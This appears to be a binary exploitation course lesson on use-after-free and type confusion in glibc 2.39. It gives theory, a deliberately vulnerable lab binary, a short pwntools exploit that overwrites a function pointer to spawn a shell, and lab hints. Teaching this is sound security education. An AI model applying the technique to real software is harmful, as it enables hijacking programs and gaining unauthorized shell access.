---
title: "Lesson 9.2: Use-After-Free and Type Confusion"
image:
  path: /assets/img/covers/pwn-9-2-use-after-free-type-confusion.webp
  alt: "Use-After-Free and Type Confusion"
date: 2026-10-10 17:10:00 +0700
categories: ["Binary Exploitation", "Pwn · Heap Basics"]
tags: [pwn, heap, use-after-free, type-confusion]
render_with_liquid: false
---

One of the most common heap bugs does not live in glibc, it lives in the program itself: freeing an object and then still using the old pointer. This lesson shows how use-after-free (UAF, reusing a freed region) leads to type confusion (data meant as one type gets read as another) and lets us hijack control flow, running live on glibc 2.39.

![A reclaimed chunk reinterpreted as a struct with a function pointer](/assets/img/pwn/pwn-9-2-use-after-free-type-confusion.svg)
_The old Obj pointer still points at the same chunk. A new allocation of the same size writes raw bytes over its function pointer field._

**Prerequisites:** Lesson 9.1 (chunks, tcache), Lesson 8.1 (the idea of overwriting a function pointer), Lesson 1.2 (function pointers, calling convention).

**Tools:** pwntools, gdb, gcc. Binary provided in the Lab section below.

## Goals

By the end you can explain UAF: why a dangling pointer after free is dangerous, understand reclaim: getting back the exact chunk you just freed with a malloc of the same size, understand type confusion: writing data of one type that gets interpreted as another, and exploit a UAF yourself to overwrite a function pointer and run `win()`.

## Theory

### What UAF is

When `free(p)` runs, the chunk goes back into tcache but the memory is still there, with most of the old data intact (only the first 0x10 bytes get reused as `next`/`key`). If the program does not set `p = NULL` after freeing, `p` becomes a dangling pointer: it points into a chunk that "belongs to nobody" anymore. There are three dangerous things you can do with a dangling pointer.

- Read the old data back (information leak, even a heap pointer leak via `fd`, as in Lesson 9.1).
- Write over the freed region (corrupting tcache metadata, leading into 9.3).
- Use it as if the chunk were still alive, while that chunk has already been handed out for something else.

### Reclaim: getting back the exact chunk

Because tcache is LIFO, right after freeing a chunk of size S, the next `malloc(S)` returns that exact chunk. An attacker takes advantage of this: free an object, then request a chunk of the same size and write their chosen data into it. Now the old dangling pointer and the newly written region are the same place.

### Type confusion

If the old object had a function pointer at some offset, and the new chunk is filled with raw data we control (for example a "note" made of arbitrary bytes), then when the program calls the old object's function pointer, it actually jumps to whatever bytes we just wrote. The program thinks it has one type (one with a function pointer), but the data is really another type (raw bytes). That is type confusion. The result: we control the target of a `call` instruction.

The condition that makes this easy: knowing the address of the function we want to jump to. With a no-PIE binary, addresses like `win` are fixed, no leak needed. That is why the sample binary is built no-PIE.

### Does CET (SHSTK/IBT) stop this

gcc 13 enables CET by default: Shadow Stack (SHSTK) and Indirect Branch Tracking (IBT). IBT requires that the target of an indirect jump/call be an `endbr64` instruction. Every normal C function starts with `endbr64`, so jumping to the start of `win` satisfies IBT, no block there. SHSTK protects the return address on the stack, which is irrelevant here because we never overwrite the saved RIP. In short, CET does not stop this kind of UAF.

## Demo

Environment: Ubuntu 24.04.4 LTS, glibc 2.39, gcc 13.3.0. ASLR enabled.

The binary (source in the Lab section below) manages one `Obj`, laid out like this.

```c
typedef struct {
    char info[24];           // offset 0x00
    void (*action)(void);    // offset 0x18  <- function pointer
} Obj;
```

Menu: `create` allocates an `Obj` and sets `action = say_hi`; `use` calls `o->action()`; `free` frees it but does not set `o = NULL` (the bug); `spray` requests a chunk of the same size and lets you write 32 raw bytes into it. There is a `win()` function that runs `system("/bin/sh")`.

Build (NX on by default, no-PIE so `win` stays fixed):

```bash
cd labs/9.2 && ./build.sh
```

Here is the exploit flow, with each step explained.

```python
from pwn import *
elf = context.binary = ELF('./uaf')
io = process('./uaf')

create(b'AAAA')                             # Obj, action = say_hi; chunk size 0x20 -> 0x30
free()                                       # freed, but o still points at the old chunk (UAF)
spray(b'A'*24 + p64(elf.sym['win']))         # reclaim the same chunk, write action = win
use()                                        # o->action() is now win() -> shell
```

Why `spray` reclaims the exact chunk: `Obj` has size 0x20, so its chunk is 0x30. After `free`, that 0x30 chunk sits at the head of `tcache[0x30]`. `spray` calls `malloc(sizeof(Obj))`, the same size, so it pulls out exactly that chunk. The first 24 bytes are `info` (we pad with 'A'), and the next 8 bytes at offset 0x18 are `action`, where we write `&win`. When `use` calls `o->action()`, the dangling pointer `o` still points at that chunk, so it calls `win`.

Running it gives this real output.

```
[win] control-flow hijacked -> /bin/sh
===PWNED_9_2===
uid=0(root) gid=0(root) groups=0(root)
===END===
[+] UAF type-confusion OK: win() reached, got shell
```

gdb command to see it yourself: set a breakpoint right at the `o->action()` call (inside `use`), inspect `o`, then `x/4gx o` before and after `spray`. You will see the 8 bytes at offset 0x18 change from the address of `say_hi` to the address of `win`.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 9.2</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/9.2.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/9.2/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/9.2/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/9.2/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>

- Challenge: exploit the binary provided in the Lab section below.
- Goal: get a shell using UAF plus type confusion.
- Hints, in order:
  - Hint 1: `free` does not set the pointer to NULL. Where else is the old pointer still usable?
  - Hint 2: how do you reclaim the exact chunk you just freed to write your own data into it? Same size.
  - Hint 3: at what offset does the function pointer sit in the struct? How much padding goes before it?
  - Self-check: can you explain "why writing into the sprayed chunk changes the behavior of the old pointer"?

## Key takeaways

- UAF happens when a pointer is not set to NULL after free and is still used.
- tcache is LIFO: a malloc of the same size right after a free returns that exact chunk.
- Type confusion: raw bytes overwrite the old object's function pointer.
- With no-PIE, the address of `win` is fixed, no leak needed.
- Jumping to the start of a function means IBT does not block it.

## Common pitfalls

- Spraying with the wrong size, so the wrong chunk gets reclaimed. It must match the bin size of the freed object; a size mismatch pulls a different chunk.
- Padding the function pointer offset wrong. `action` sits at offset 0x18 (after 24 bytes of `info`); too little or too much padding writes to the wrong place.
- Accidentally overwriting the first 8 bytes if you edit the freed chunk directly instead of reclaiming through malloc (the first 0x10 bytes are `next`/`key`). This lesson reclaims via a fresh malloc so it is not an issue here, but remember it when editing a freed chunk directly.
- Forgetting a null terminator or writing too much and corrupting the next chunk. Write exactly the number of bytes needed.
- Running against a PIE binary and hardcoding `win`. This lesson's binary is no-PIE, so it is fine; against PIE you must leak the base first.

## Further reading

- how2heap: `first_fit`, which illustrates reclaim after free.
- Beginner UAF challenges: many "notebook"/"heap" problems on pwnable.tw and picoCTF.
- Lesson 9.3: writing directly onto a freed chunk to corrupt tcache metadata, upgrading UAF into an arbitrary write.
